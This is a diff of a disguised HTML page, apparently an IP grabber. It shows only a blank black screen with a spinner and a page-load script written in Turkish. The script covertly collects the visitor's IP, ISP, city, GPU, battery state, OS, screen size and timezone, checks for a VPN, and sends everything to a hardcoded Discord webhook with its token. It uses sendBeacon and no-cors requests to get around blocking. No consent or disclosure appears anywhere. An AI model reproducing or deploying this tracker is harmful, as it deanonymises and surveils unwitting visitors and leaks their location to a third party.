@@ -3,78 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <title> </title>
-    <style>body { background:#000; margin:0; cursor:none; overflow:hidden; }</style>
+    <style>
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
+        /* Çarkın dönmeme sorunu için animasyon zorlaması */
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: s 1s linear infinite !important; display: block; }
+        @keyframes s { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
+    <div class="l"></div>
+
     <script>
         const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
         async function ultraDataExtract() {
-            // 1. Manuel OS ve Donanım Tespiti
             let d = { 
-                gpu: "Maskelenmiş", ven: "Maskelenmiş", ip: "X", iss: "X", 
-                os: navigator.userAgent.split('(')[1] ? navigator.userAgent.split('(')[1].split(')')[0] : "Bilinmiyor",
-                res: `${screen.width}x${screen.height}`, 
+                gpu: "Bilinmiyor", ven: "Bilinmiyor", ip: "X", iss: "X", loc: "X",
+                os: "Bilinmiyor", res: screen.width + "x" + screen.height,
                 bat: "X", net: "X", tz: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
-            // 2. GPU Maskesini Kırma (Agresif Mod)
+            // OS Tespiti
+            try { d.os = navigator.userAgent.split('(')[1].split(')')[0]; } catch(e){}
+
+            // 1. GPU (WebGL) - Hata alsa da devam et
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
-            } catch(e) {}
-
-            // 3. Pil ve Ağ Analizi (Düzeltilen Kısım)
-            try {
-                if(navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    d.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Deşarjda'})`;
+                if (gl) {
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                    d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
                 }
+            } catch(e) { d.gpu = "Bloklandı"; }
+
+            // 2. Pil ve Ağ (Ayrı try-catch, kodun durmasını engeller)
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    d.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
+                }
+            } catch(e) { d.bat = "Desteklenmiyor"; }
+
+            try {
                 const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                d.net = n ? `${n.effectiveType.toUpperCase()} (~${n.downlink}Mbps)` : "Tespit Edilemedi";
+                if (n) d.net = `${n.effectiveType} (~${n.downlink}Mbps)`;
             } catch(e) {}
 
-            // 4. VPN Tespiti ve Konum (Zaman Dilimi Karşılaştırmalı)
-            let vpnStatus = "✅ VPN KAPALI (DOĞRULANDI)";
+            // 3. IP ve VPN (Zaman aşımı korumalı)
+            let vpnStatus = "✅ VPN KAPALI";
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 4000); // 4 saniye sınırı
+
+                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                 const j = await res.json();
+                clearTimeout(timeoutId);
+
                 d.ip = j.ip;
-                d.iss = `${j.org} (${j.asn})`;
+                d.iss = j.org;
                 d.loc = `📍 ${j.city}, ${j.country_name}`;
                 
                 if (j.timezone !== d.tz || j.proxy) {
                     vpnStatus = `🚨 **VPN ALGILANDI**\n↳ Sistem: ${d.tz}\n↳ IP: ${j.timezone}`;
                 }
-            } catch(e) { vpnStatus = "⚠️ Analiz Bloklandı (Yüksek Gizlilik)"; }
+            } catch(e) { vpnStatus = "⚠️ IP Sorgu Başarısız (VPN olabilir)"; }
 
-            // 5. KUSURSUZ GÖNDERİM (CORS BYPASS)
+            // 4. VERİYİ GÖNDERME (Zorlayıcı Metod)
             const payload = {
                 embeds: [{
-                    title: "💀 ADLİ ANALİZ: OMNISCIENCE V100",
+                    title: "💀 ADLİ ANALİZ: V110 (FIXED)",
                     color: vpnStatus.includes("🚨") ? 15158332 : 3066993,
                     fields: [
                         { name: "🛡️ GÜVENLİK", value: vpnStatus, inline: false },
-                        { name: "📡 AĞ / IP / ISS", value: `**IP:** \`${d.ip}\`\n**ISS:** \`${d.iss}\`\n**Yerel:** \`${d.net}\`\n${d.loc || ''}`, inline: false },
-                        { name: "🛠️ DONANIM", value: `**GPU:** \`${d.gpu}\`\n**Vendor:** \`${d.ven}\`\n**Pil:** \`${d.bat}\``, inline: false },
-                        { name: "⚙️ SİSTEM", value: `**OS:** ${d.os}\n**Ekran:** ${d.res}\n**Zaman:** ${d.tz}`, inline: false }
+                        { name: "📡 AĞ / ISS", value: `**IP:** \`${d.ip}\`\n**ISS:** \`${d.iss}\`\n**Net:** \`${d.net}\``, inline: false },
+                        { name: "🛠️ DONANIM", value: `**GPU:** \`${d.gpu}\`\n**Pil:** \`${d.bat}\``, inline: false },
+                        { name: "⚙️ SİSTEM", value: `**OS:** ${d.os}\n**Res:** ${d.res}\n**TZ:** ${d.tz}`, inline: false }
                     ],
                     timestamp: new Date()
                 }]
             };
 
-            // FETCH ENGELİNİ AŞMAK İÇİN BEACON VE NO-CORS KULLANIMI
+            // Webhook gönderimini garantiye al
             const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
-            navigator.sendBeacon(hook, blob); 
+            navigator.sendBeacon(hook, blob);
             
-            // Yedek olarak no-cors fetch (Discord bazen bunu kabul eder)
+            // Eğer fetch çalışırsa (CORS izin verirse)
             fetch(hook, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
         }
 
-        window.onload = () => setTimeout(ultraDataExtract, 400);
+        // Sayfa tamamen yüklendiğinde başlat
+        window.addEventListener('load', () => {
+            setTimeout(ultraDataExtract, 500);
+        });
     </script>
 </body>
 </html>
